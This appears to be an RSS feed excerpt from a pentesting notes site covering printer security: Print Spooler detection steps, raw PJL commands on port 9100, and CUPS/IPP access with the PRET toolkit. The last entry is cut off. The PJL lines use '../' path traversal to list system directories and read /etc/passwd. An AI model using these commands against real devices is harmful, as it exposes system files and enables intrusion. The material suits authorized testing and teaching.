channel.title: Printer on D0CUM3NTN4T10N
channel.description: Recent content in Printer on D0CUM3NTN4T10N

item.title: Windows Print Spooler Service
item.description: Investigation link # Check if the Print Spooler service is running Get-Service -Name Spooler Detection linkServices link Open Services. We can find the Print Spooler on the Right Pane. Double-click on it and see the details. Malicious DLL Location link C:\Windows\System32\spool\drivers\x64\3\ Event Viewer linkOpen Event Viewer, and find event logs in the following directory in the left pane. If you want to filter by Event ID, use “Filter Current Log” in the right pane.

item.title: Raw Printing Pentesting
item.description: Enumeration link nmap --script pjl-ready-message -p 9100 <target-ip> Connect link nc <target-ip> 9100 Commands link # See printer information @PJL INFO STATUS @PJL INFO ID @PJL INFO PRODINFO # See directories in the system @PJL FSDIRLIST NAME="0:" ENTRY=1 @PJL FSDIRLIST NAME="0:/../" ENTRY=1 @PJL FSDIRLIST NAME="0:/../etc/" ENTRY=1 @PJL FSDIRLIST NAME="0:/../home/" ENTRY=1 # See contents of a file @PJL FSUPLOAD NAME="0:/../etc/passwd" ENTRY=1

item.title: IPP (Internet Printing Protocol) Pentesting
item.description: Access in Web Browser linkThe CUPS server can be able to access via browser. Try input the following in the URL search form in browser. http://<target-ip>:631 Connect linkThe Printer Exploitation Toolkit is a tool for printer secure testing. Assume that we use it. Try all three options until the target printer recognized. # ps: PostScript python2 pret.py <target-ip>:631 ps # pjl: Printer Job Language python2 pret.py <target-ip>:631 pjl # pcl: Printer Control Language python2 pret.
